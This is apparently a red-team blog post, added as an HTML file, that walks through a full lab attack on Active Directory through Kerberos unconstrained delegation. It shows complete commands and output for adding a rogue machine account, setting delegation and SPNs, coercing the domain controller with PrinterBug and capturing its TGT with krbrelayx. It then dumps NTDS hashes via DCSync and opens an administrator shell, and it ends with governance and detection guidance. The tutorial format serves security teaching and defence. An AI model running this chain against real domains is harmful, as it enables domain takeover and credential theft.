@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Kerberos Attack via Unconstrained Delegation with krbrelayx // byt3n33dl3</title>
+    <link rel="icon" type="image/png" href="../images/logo.png">
+    <link rel="stylesheet" href="../theme/css/pure.css">
+    <link rel="stylesheet" href="../theme/css/styles.css">
+    <link rel="stylesheet" href="../theme/css/pygments.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar pure-u">
+        <div class="cover-img"></div>
+        <div class="cover-body">
+            <header class="header">
+                <hgroup>
+                    <h1 class="brand-main"><a href="../index.html">AdverXarial</a></h1>
+                    <p class="tagline">Red Team // Adversary Emulator // Maintained by byt3n33dl3</p>
+                    <p class="links">
+                        <a href="../pages/about.html">About</a>
+                        <a href="https://byt3n33dl3.substack.com/">Archives</a>
+                    </p>
+                    <p class="social">
+                        <a href="https://github.com/byt3n33dl3/">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/github.svg" width="20" height="20" alt="GitHub">
+                        </a>
+                        <a href="#">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/linkedin.svg" width="20" height="20" alt="LinkedIn">
+                        </a>
+                        <a href="https://x.com/byt3n33dl3/">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/twitter.svg" width="20" height="20" alt="Twitter">
+                        </a>
+                    </p>
+                </hgroup>
+            </header>
+        </div>
+    </div>
+
+    <div class="pure-u">
+        <div class="content">
+            <div class="post-header">
+                <img src="../images/logo.png" alt="avatar" class="post-avatar">
+                <div class="post-meta-wrapper">
+                    <h2 class="post-author"><a href="../pages/byt3n33dl3.html">byt3n33dl3</a></h2>
+                    <p class="post-date">Published Tue 20 January 2026</p>
+                </div>
+            </div>
+
+            <p class="back-link"><a href="../index.html">← Home</a></p>
+
+            <article class="post-content">
+                <h1>Kerberos Attack via Unconstrained Delegation with krbrelayx</h1>
+                <p class="post-tags">Tags: <a href="#">GRC</a> · <a href="#">Red Teaming</a> · <a href="#">Kerberos</a></p>
+
+                <p class="post-meta">Blog released: 2026 Tue 20 Jan.</p>
+
+                <h1>Legacy Kerberos Exploitation</h1>
+
+                <p>With SpecterOps // Creator and Maintainer of <a href="https://github.com/SpecterOps/BloodHound/">BloodHound</a> the attack-path management.</p>
+
+                <div class="video-container">
+                <img alt="specterops-logo" width="50%" src="../images/specterops-logo.png"></iframe>
+                </div><br>
+                
+                <p>Unconstrained Delegation is a legacy Kerberos trust mechanism that Microsoft introduced with Windows in early 2000. Two decades later, it remains enabled in production environments because administrators don't understand the security implications.</p> 
+                
+                <p>A typical Kerberos authentication attack scenario originates from an unconstrained delegation, where attackers identify misconfigurations and steal authentication information, such as password hashes, Kerberos tickets, and application access tokens.</p> 
+                
+                <p>Attackers can escalate higher privileges and move laterally within an organization's IT infrastructure to target high-value assets.</p>
+                
+                <p>When a user authenticates to a computer with unconstrained delegation, that user's Kerberos <code>TGT</code> gets saved to that computer's memory so the computer can impersonate the authenticated user when required for accessing resources on that user's behalf.</p>  
+                
+                <p>This privilege is <ins>usually given to computer objects</ins> within the domain.</p> 
+                
+                <p>However, during a recent Praetorian internal network security assessment, Praetorian engineers encountered a user object that was kerberoastable and configured with these privileges.</p>
+                
+                <p>PS that BloodHound won't (sometimes, collectors matter) show you this path. <ins>Antivirus won't stop it</ins>, it's pure Kerberos protocol abuse and attack.</p>
+
+                <div class="video-container">
+                <img alt="image-cerbersu" width="35%" src="../images/cerberus-image-no-bg.png"></iframe>
+                </div>
+                
+                <p>When a computer is trusted for unconstrained delegation, it can impersonate any user who authenticates to it. Force the Domain Controller to authenticate to your controlled machine, steal its TGT, and you own the domain.</p> 
+                
+                <p>This is what's called KUD, FKA Kerberos Unconstrained Delegation abuse, and Unconstrained delegation abuse with <a href="https://github.com/dirkjanm/krbrelayx">krbrelayx</a> project.</p>
+                
+                <h1>Unconstrained Delegation Overview</h1>
+
+                <p>Delegation allows a service to impersonate users when accessing other services on their behalf. Think of a web application accessing a database using the authenticated user's credentials rather than a service account.</p>
+
+                <h2>How Unconstrained Delegation Works</h2>
+
+                <p>When enabled on a computer account:</p>
+
+                <ol>
+                    <li>User authenticates to the service.</li>
+                    <li>User's TGT is sent along with the service ticket.</li>
+                    <li>Service stores the TGT in memory.</li>
+                    <li>Service can use that TGT to impersonate the user anywhere.</li>
+                </ol>
+
+                <p>In order to abuse the unconstrained delegations privileges of an account, an attacker must add his machine to its <code>SPNs</code> (of the compromised account) and add a DNS entry for that name.</p>
+
+                <p>The problem?</p> 
+                
+                <p>The service receives <ins><strong>forwardable TGTs</strong></ins> for anyone who authenticates, including Domain Admins and the Domain Controller computer account itself.</p>
+
+                <h2>Why This Still Exists</h2>
+
+                <p>Microsoft deprecated unconstrained delegation with Windows Server 2003, introducing constrained delegation and later Resource-Based Constrained Delegation FKA <code>RBCD</code>. Despite this:</p>
+
+                <ul>
+                    <li>DC have unconstrained delegation by default.</li>
+                    <li>Legacy applications.</li>
+                    <li>Administrators enable it without understanding the risk.</li>
+                    <li>Group Policy doesn't warn when configuring it.</li>
+                    <li>Audit tools rarely <ins>(couple-times)</ins> flag it as critical.</li>
+                </ul>
+
+                <h1>The Attack Path: SeEnableDelegationPrivilege</h1>
+
+                <p>This attack demonstrates privilege escalation through delegation configuration rights. The key is <code>SeEnableDelegationPrivilege</code>, a user right that allows configuring delegation settings on computer accounts.</p>
+
+                <h2>Initial Enumeration</h2>
+
+                <p>Starting with domain credentials:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ nxc ldap 192.168.2.68 -u N.Thompson -p KALEB_2341
+LDAP        192.168.2.68    389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vuln)
+LDAP        192.168.2.68    389    DC1              [+] delegate.vuln\N.Thompson:KALEB_2341</code></pre>
+
+                <p>Confirm WinRM access:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ nxc winrm 192.168.2.68 -u N.Thompson -p KALEB_2341
+WINRM       192.168.2.68    5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vuln)
+WINRM       192.168.2.68    5985   DC1              [+] delegate.vuln\N.Thompson:KALEB_2341 (Pwn3d!)</code></pre>
+
+                <h2>Identifying the Privilege</h2>
+
+                <p>Connect via WinRM and enumerate user rights:</p>
+
+                <pre><code class="language-plaintext">*Evil-WinRM* PS C:\Users\N.Thompson\Documents> whoami
+delegate\n.thompson
+*Evil-WinRM* PS C:\Users\N.Thompson\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name           SID
+=================== ==============================================
+delegate\n.thompson S-1-5-21-1484473093-3449528695-2030935120-1108
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                            Attributes
+=========================================== ================ ============================================== ==================================================
+Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+DELEGATE\delegation admins                  Group            S-1-5-21-1484473093-3449528695-2030935120-1121 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                                                    State
+============================= ============================================================== =======
+SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
+SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.</code></pre>
+
+                <p>The critical privilege: <code>SeEnableDelegationPrivilege</code>. This allows us to configure both unconstrained and constrained delegation for machine accounts.</p>
+
+                <h2>Why BloodHound Misses This</h2>
+
+                <p>BloodHound tracks ACL-based relationships: who has <code>GenericAll</code>, <code>WriteDacl</code>, etc.</p> 
+                
+                <p>It doesn't enumerate user rights assignments like <code>SeEnableDelegationPrivilege</code> because these are configured via Group Policy, <ins>not object ACLs.</ins></p>
+
+                <p>The attack path exists, but it's invisible to standard enumeration tools.</p>
+
+                <h1>Exploitation Strategy</h1>
+
+                <p>Our goal: force the Domain Controller to authenticate to a machine we control with unconstrained delegation enabled. When it does, we capture its TGT and use it for DCSync.</p>
+
+                <h2>Attack Steps</h2>
+
+                <ol>
+                    <li>Create a computer account.</li>
+                    <li>Configure unconstrained delegation on that computer.</li>
+                    <li>Add DNS record pointing to our attack machine.</li>
+                    <li>Set service principal names <code>SPNs</code> for Kerberos.</li>
+                    <li>Run <a href="https://github.com/dirkjanm/krbrelayx">krbrelayx</a> to listen for incoming tickets.</li>
+                    <li>Force DC authentication using PrinterBug or similar.</li>
+                    <li>Capture DC's TGT from krbrelayx.</li>
+                    <li>Use DC Ticket for DCSync.</li>
+                </ol>
+
+                <h1>Step 1: Machine Account Quota Check</h1>
+
+                <p>Verify we can add computer accounts:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ nxc ldap 192.168.2.68 -u N.Thompson -p KALEB_2341 -M maq
+LDAP        192.168.2.68    389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vuln)
+LDAP        192.168.2.68    389    DC1              [+] delegate.vuln\N.Thompson:KALEB_2341 
+MAQ         192.168.2.68    389    DC1              [*] Getting the MachineAccountQuota
+MAQ         192.168.2.68    389    DC1              MachineAccountQuota: 10</code></pre>
+
+                <p>Default <code>MachineAccountQuota</code> is 10, allowing any authenticated user to add up to 10 computer accounts. This is rarely changed in production environments.</p>
+
+                <h1>Step 2: Add Computer Account</h1>
+
+                <p>Create a machine account we control:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ addcomputer.py -dc-ip 192.168.2.68 -computer-name evil$ -computer-pass Passw0rd1 delegate.vuln/N.Thompson:KALEB_2341
+Impacket v0.14.0.dev0+20251107.4500.2f1d6eb2 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Successfully added machine account evil$ with password Passw0rd1.</code></pre>
+
+                <p>Output:</p>
+
+                <pre><code class="language-plaintext">Impacket v0.14.0.dev0+20251107.4500.2f1d6eb2 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Successfully added machine account evil$ with password Passw0rd1.</code></pre>
+
+                <p>Credentials to remember:</p>
+
+                <pre><code class="language-plaintext">Username: evil$
+Password: Passw0rd1</code></pre>
+
+                <h1>Step 3: Enable Unconstrained Delegation</h1>
+
+                <p>Using bloodyAD to set the delegation flag:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ bloodyAD --host 192.168.2.68 -u n.thompson -p KALEB_2341 -d delegate.vuln add uac -f TRUSTED_FOR_DELEGATION 'evil$'
+[-] ['TRUSTED_FOR_DELEGATION'] property flags added to evil$'s userAccountControl</code></pre>
+
+                <p>Output confirms modification:</p>
+
+                <pre><code class="language-plaintext">[-] ['TRUSTED_FOR_DELEGATION'] property flags added to evil$'s userAccountControl</code></pre>
+
+                <p>The <code>TRUSTED_FOR_DELEGATION</code> flag in <code>userAccountControl</code> attribute marks the computer as trusted for unconstrained delegation. Any TGT sent to this computer will be cached.</p>
+
+                <h1>Step 4: DNS Record Configuration</h1>
+
+                <p>Add DNS record pointing to our attack machine:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ python3 dnstool.py -u 'delegate.VULN\evil$' -p Passw0rd1 --action add --record evil.delegate.VULN -d 10.10.14.8 -t A -dns-ip 192.168.2.68 dc1.delegate.vuln
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully</code></pre>
+
+                <p>Output:</p>
+
+                <pre><code class="language-plaintext">[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully</code></pre>
+
+                <p>Now <code>evil.delegate.vuln</code> resolves to our Kali machine at <code>10.10.14.8</code>. When services try to authenticate to this hostname, they'll connect to us.</p>
+
+                <h1>Step 5: Service Principal Names</h1>
+
+                <p>SPNs identify services in Kerberos. Add CIFS service for SMB-based authentication:</p>
+
+                <pre><code class="language-bash">python3 addspn.py -u 'delegate.vuln\N.Thompson' -p KALEB_2341 -s 'cifs/evil.delegate.vuln' -t evil$ -dc-ip 192.168.2.68 dc1.delegate.vuln --additional</code></pre>
+
+                <p>First SPN addition:</p>
+
+                <pre><code class="language-plaintext">[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[+] Found modification target
+[+] SPN Modified successfully</code></pre>
+
+                <p>Add again to ensure proper registration:</p>
+
+                <pre><code class="language-bash">python3 addspn.py -u 'delegate.vuln\N.Thompson' -p KALEB_2341 -s 'cifs/evil.delegate.vuln' -t evil$ -dc-ip 192.168.2.68 dc1.delegate.vuln</code></pre>
+
+                <pre><code class="language-plaintext">[+] SPN Modified successfully</code></pre>
+
+                <h2>Internal Verification</h2>
+
+                <p>Confirm SPN configuration from within the domain with PowerShell Command:</p>
+
+                <pre><code class="language-powershell">Get-ADComputer -Identity "[COMPUTER$]" -Properties ServicePrincipalNames | Select-Object -ExpandProperty ServicePrincipalNames</code></pre>
+
+                <pre><code class="language-plaintext">*Evil-WinRM* PS C:\Users\N.Thompson> Get-ADComputer -Identity "evil$" -Properties ServicePrincipalNames | Select-Object -ExpandProperty ServicePrincipalNames
+cifs/evil.delegate.vuln</code></pre>
+
+                <p>SPN registered correctly. The computer account now looks like a legitimate file server from Kerberos perspective.</p>
+
+                <h1>Step 6: NTLM Hash Generation</h1>
+
+                <p>krbrelayx requires the NTLM hash of the computer account password. Convert cleartext password to NTLM hash using MD4:</p>
+
+                <pre><code class="language-python">import hashlib
+password = "Passw0rd1"
+ntlm_hash = hashlib.new('md4', password.encode('utf-16le')).hexdigest()
+print(f"NTLM Hash: {ntlm_hash}")</code></pre>
+
+                <p>Which you can find <a href="https://gist.github.com/byt3n33dl3/2f719df2e45df933b74ac7f218c25e4a"><ins>here</ins></a> for my Gits, then execute the script:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ python3 hash_convert.py
+NTLM Hash: 5858d47a41e40b40f294b3100bea611f</code></pre>
+
+                <p>Store this hash: <code>5858d47a41e40b40f294b3100bea611f</code></p>
+
+                <h2>Verify Delegation Flag</h2>
+
+                <p>Double-check the delegation setting is persistent:</p>
+
+                <pre><code class="language-bash">bloodyAD -d delegate.vuln -u n.thompson -p KALEB_2341 --host dc1.delegate.vuln add uac 'evil$' -f TRUSTED_FOR_DELEGATION</code></pre>
+
+                <pre><code class="language-plaintext">[-] ['TRUSTED_FOR_DELEGATION'] property flags added to evil$'s userAccountControl</code></pre>
+
+                <h1>Step 7: krbrelayx Listener</h1>
+
+                <p>Launch krbrelayx with the NTLM hash to intercept incoming Kerberos tickets:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ python3 krbrelayx.py -hashes :5858d47a41e40b40f294b3100bea611f
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client SMB loaded..
+[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
+[*] Running in unconstrained delegation abuse mode using the specified credentials.
+[*] Setting up SMB Server
+
+[*] Setting up HTTP Server on port 80
+[*] Setting up DNS Server
+[*] Servers started, waiting for connections
+[*] SMBD: Received connection from 192.168.2.68
+[*] Got ticket for DC1$@DELEGATE.VULN [krbtgt@DELEGATE.VULN]
+[*] Saving ticket in DC1$@DELEGATE.VULN_krbtgt@DELEGATE.VULN.ccache
+[*] SMBD: Received connection from 192.168.2.68
+[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
+[*] SMBD: Received connection from 192.168.2.68
+[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'</code></pre>
+
+                <p>krbrelayx initializes multiple protocol handlers:</p>
+
+                <pre><code class="language-plaintext">[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client SMB loaded..
+[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
+[*] Running in unconstrained delegation abuse mode using the specified credentials.
+[*] Setting up SMB Server
+[*] Setting up HTTP Server on port 80
+[*] Setting up DNS Server
+[*] Servers started, waiting for connections</code></pre>
+
+                <p>krbrelayx is now listening, any authentication to our controlled machine will result in TGT capture.</p>
+
+                <h1>Step 8: Coercion Attack</h1>
+
+                <p>Force the Domain Controller to authenticate to our machine. First, identify available coercion methods:</p>
+
+                <pre><code class="language-bash">nxc smb DC1.delegate.vuln -u 'evil$' -p Passw0rd1 -M coerce_plus</code></pre>
+
+                <p>Results show multiple vulnerable coercion methods:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ nxc smb DC1.delegate.vuln -u 'evil$' -p Passw0rd1 -M coerce_plus
+SMB         192.168.2.68   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vuln) (signing:True) (SMBv1:False) 
+SMB         192.168.2.68   445    DC1              [+] delegate.vuln\evil$:Passw0rd1 
+COERCE_PLUS 192.168.2.68   445    DC1              VULNERABLE, DFSCoerce
+COERCE_PLUS 192.168.2.68   445    DC1              VULNERABLE, PetitPotam
+COERCE_PLUS 192.168.2.68   445    DC1              VULNERABLE, PrinterBug
+COERCE_PLUS 192.168.2.68   445    DC1              VULNERABLE, PrinterBug
+COERCE_PLUS 192.168.2.68   445    DC1              VULNERABLE, MSEven</code></pre>
+
+                <p>PrinterBug is the most reliable.</p> 
+                
+                <p>Execute the coercion:</p>
+
+                <pre><code class="language-bash">nxc smb DC1.delegate.vuln -u 'evil$' -p Passw0rd1 -M coerce_plus -o LISTENER=evil.delegate.vuln METHOD=PrinterBug</code></pre>
+
+                <p>Attack succeeds:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ nxc smb DC1.delegate.vuln -u 'evil$' -p Passw0rd1 -M coerce_plus -o LISTENER=evil.delegate.vuln METHOD=PrinterBug
+SMB         192.168.2.68   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vuln) (signing:True) (SMBv1:False) 
+SMB         192.168.2.68   445    DC1              [+] delegate.vuln\evil$:Passw0rd1 
+COERCE_PLUS 192.168.2.68   445    DC1              VULNERABLE, PrinterBug
+COERCE_PLUS 192.168.2.68   445    DC1              Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx</code></pre>
+
+                <p>PrinterBug forces the DC computer account to authenticate to <code>evil.delegate.vuln</code>, which resolves to our krbrelayx listener.</p>
+
+                <h1>Step 9: Ticket Capture</h1>
+
+                <p>Back to our krbrelayx listener, tickets are incoming:</p>
+
+                <pre><code class="language-plaintext">[*] SMBD: Received connection from 192.168.2.68
+[*] Got ticket for DC1$@DELEGATE.VULN [krbtgt@DELEGATE.VULN]
+[*] Saving ticket in DC1$@DELEGATE.VULN_krbtgt@DELEGATE.VULN.ccache
+[*] SMBD: Received connection from 192.168.2.68
+[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
+[*] SMBD: Received connection from 192.168.2.68
+[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'</code></pre>
+
+                <p>Critical line here, we got ticket for the DC itself.</p>
+
+                <div class="video-container">
+                <img alt="unconstrained-delegation-path" width="70%" src="../images/unconstrained-delegation-photo.jpg"></iframe>
+                </div><br>
+
+                <p>We've captured the Domain Controller's TGT. Verify the file:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ ls
+bhce  DC1$@DELEGATE.VULN_krbtgt@DELEGATE.VULN.ccache</code></pre>
+
+                <h1>Step 10: DCSync with Captured TGT</h1>
+
+                <p>Export the captured ticket for Kerberos authentication:</p>
+
+                <pre><code class="language-bash">export KRB5CCNAME='DC1$@DELEGATE.VULN_krbtgt@DELEGATE.VULN.ccache'</code></pre>
+
+                <p>Verify ticket validity:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ klist
+Ticket cache: FILE:DC1$@DELEGATE.VULN_krbtgt@DELEGATE.VULN.ccache
+Default principal: DC1$@DELEGATE.VULN
+
+Valid starting       Expires              Service principal
+01/18/2026 13:22:10  01/18/2026 22:30:49  krbtgt/DELEGATE.VULN@DELEGATE.VULN
+        renew until 01/25/2026 12:30:49</code></pre>
+
+                <p>Ticket is valid for nearly 10 hours with a 7-day renewal window. Execute DCSync:</p>
+
+                <pre><code class="language-bash">nxc smb DC1.delegate.vuln --use-kcache --ntds</code></pre>
+
+                <p>NetExec prompts about potential DC crash on Server 2019, but 2022 is stable:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ nxc smb DC1.delegate.vuln --use-kcache --ntds                                                                        
+[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y
+SMB         DC1.delegate.vuln 445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vuln) (signing:True) (SMBv1:False) 
+SMB         DC1.delegate.vuln 445    DC1              [+] DELEGATE.VULN\DC1$ from ccache 
+SMB         DC1.delegate.vuln 445    DC1              [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         DC1.delegate.vuln 445    DC1              Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::
+SMB         DC1.delegate.vuln 445    DC1              Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         DC1.delegate.vuln 445    DC1              krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54999c1daa89d35fbd2e36d01c4a2cf2:::
+SMB         DC1.delegate.vuln 445    DC1              A.Briggs:1104:aad3b435b51404eeaad3b435b51404ee:8e5a0462f96bc85faf20378e243bc4a3:::
+SMB         DC1.delegate.vuln 445    DC1              b.Brown:1105:aad3b435b51404eeaad3b435b51404ee:deba71222554122c3634496a0af085a6:::
+SMB         DC1.delegate.vuln 445    DC1              R.Cooper:1106:aad3b435b51404eeaad3b435b51404ee:17d5f7ab7fc61d80d1b9d156f815add1:::
+SMB         DC1.delegate.vuln 445    DC1              J.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:4ff255c7ff10d86b5b34b47adc62114f:::
+SMB         DC1.delegate.vuln 445    DC1              N.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:4b514595c7ad3e2f7bb70e7e61ec1afe:::
+SMB         DC1.delegate.vuln 445    DC1              DC1$:1000:aad3b435b51404eeaad3b435b51404ee:f7caf5a3e44bac110b9551edd1ddfa3c:::
+SMB         DC1.delegate.vuln 445    DC1              evil$:4601:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f:::
+SMB         DC1.delegate.vuln 445    DC1              [+] Dumped 10 NTDS hashes to /root/.nxc/logs/ntds/DC1_DC1.delegate.vuln_2026-01-18_132641.ntds of which 8 were added to the database
+SMB         DC1.delegate.vuln 445    DC1              [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         DC1.delegate.vuln 445    DC1              [*] cat /root/.nxc/logs/ntds/DC1_DC1.delegate.vuln_2026-01-18_132641.ntds | grep -iv disabled | cut -d ':' -f1
+SMB         DC1.delegate.vuln 445    DC1              [*] grep -iv disabled /root/.nxc/logs/ntds/DC1_DC1.delegate.vuln_2026-01-18_132641.ntds | cut -d ':' -f1</code></pre>
+
+                <p>Full domain compromise achieved.</p> 
+                
+                <p>Administrator hash extracted: <code>c32198ceab4cc695e65045562aa3ee93</code></p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i delegate.vuln -u administrator -H c32198ceab4cc695e65045562aa3ee93                            
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+delegate\administrator</code></pre>
+                
+                <p>Done! as an AdverXaries this it profit!!</p>
+
+                <h1>GRC and Policy Implications</h1>
+
+                <p>This attack demonstrates fundamental governance failures in Active Directory management.</p>
+
+                <h2>Configuration Management</h2>
+
+                <p>Organizations lack proper configuration management for delegation settings:</p>
+
+                <ul>
+                    <li>No inventory of systems with unconstrained delegation.</li>
+                    <li>No approval workflow configuration.</li>
+                    <li>No periodic auditing of delegation settings.</li>
+                    <li>No documentation of why delegation was enabled.</li>
+                </ul>
+
+                <p>Risk management frameworks like <code>NIST 800-53</code> require configuration management (CM-2) and configuration change control (CM-3). Delegation settings should be treated as critical security parameters requiring formal change management.</p>
+
+                <h2>Privilege Management Policy</h2>
+
+                <p><code>SeEnableDelegationPrivilege</code> is equivalent to Domain Admin in this scenario, yet it's rarely included in privileged access management programs:</p>
+
+                <ul>
+                    <li>Not tracked in PAM solution.s</li>
+                    <li>Not subject to just-in-time access controls.</li>
+                    <li>No approval workflow for assignment.</li>
+                    <li>No monitoring of usage.</li>
+                </ul>
+
+                <p>CIS Controls v8 requires inventory and control of privileged accounts <ins>(Control 5.4).</ins> User rights assignments like <code>SeEnableDelegationPrivilege</code> must be included in this inventory.</p>
+
+                <h2>MachineAccountQuota Policy</h2>
+
+                <p>The default <code>MachineAccountQuota</code> of 10 allows any authenticated user to add computers. This violates least privilege principles:</p>
+
+                <ul>
+                    <li>No business justification for users adding computers.</li>
+                    <li>No approval process for machine account creation.</li>
+                    <li>No monitoring of unexpected account additions.</li>
+                    <li>Created accounts persist indefinitely.</li>
+                </ul>
+
+                <p>Best practice: Set <code>MachineAccountQuota</code> to 0 and delegate computer account creation to specific IT groups through controlled processes.</p>
+
+                <h2>Change Detection and Monitoring</h2>
+
+                <p>The <ins>attack chain involved</ins> multiple detectable changes:</p>
+
+                <ul>
+                    <li>Computer account creation.</li>
+                    <li><code>UAC</code> attribute modification.</li>
+                    <li>DNS record addition.</li>
+                    <li>SPN registration.</li>
+                    <li>Authentication coercion.</li>
+                    <li>DCSync replication request.</li>
+                </ul>
+
+                <p>Organizations with <a href="https://www.splunk.com/en_us/form/splunk-guide-to-siem-replacement.html"><ins>proper SIEM integration</ins></a> and AD change monitoring would detect several of these steps. However, most environments lack:</p>
+
+                <ul>
+                    <li>Real-time AD attribute change monitoring.</li>
+                    <li>DNS modification alerting.</li>
+                    <li>SPN registration monitoring.</li>
+                    <li>Correlation between related suspicious activities.</li>
+                </ul>
+
+                <h2>Compliance Considerations</h2>
+
+                <p>This attack <ins>violates multiple compliance</ins> requirements:</p>
+
+                <p>PCI DSS 4.0</p>
+                <ul>
+                    <li>Requirement 7.2.5: User access rights must follow least privilege</li>
+                    <li>Requirement 8.2.2: Authentication mechanisms must be secured</li>
+                </ul>
+
+                <p>ISO 27001:2022</p>
+                <ul>
+                    <li>A.5.15: Access control regarding delegation settings not properly controlled</li>
+                    <li>A.5.18: Access rights for excessive privileges granted</li>
+                </ul>
+
+                <p>I think that's most of it for us Adversaries and some <code>sparks</code> of GRC.</p>
+
+                <p>Thanks for reading!!</p>
+
+                <p class="go-top"><a href="#">Go Top</a></p>
+            </article>
+
+            <footer class="footer">
+                <p>&copy; byt3n33dl3 2024 · Built with blood, sweat, and HTML · <a href="../pages/all.atom.xml">RSS</a></p>
+            </footer>
+        </div>
+    </div>
+</div>
+</body>
+</html>
+                
